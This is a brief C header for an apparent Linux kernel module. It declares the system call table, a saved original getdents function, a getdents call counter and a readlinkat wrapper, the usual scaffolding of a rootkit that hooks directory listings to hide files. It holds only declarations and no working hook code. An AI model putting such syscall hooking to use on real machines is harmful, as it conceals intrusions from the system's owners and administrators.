#ifndef MAIN_HEADER
#define MAIN_HEADER

extern int getdents_call_counter;

extern void **sys_call_table;

asmlinkage int original_getdents (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t syscall_readlinkat (int dirfd, const char *path, char *buf, size_t bufsiz);

#endif
